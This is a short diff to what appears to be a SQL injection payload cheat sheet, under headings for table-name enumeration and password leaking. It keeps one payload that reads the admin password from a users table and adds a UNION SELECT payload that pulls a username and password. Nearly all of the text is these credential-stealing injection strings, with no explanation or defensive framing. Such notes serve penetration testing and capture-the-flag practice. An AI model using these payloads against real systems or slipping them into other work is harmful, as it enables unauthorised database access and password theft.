@@ -31,3 +31,5 @@ Table name enumeration
 Leak Password
 
     a' || (select password from xde43_users where role="admin"));--
+
+    'UNION SELECT username, password FROM users WHERE id=1--
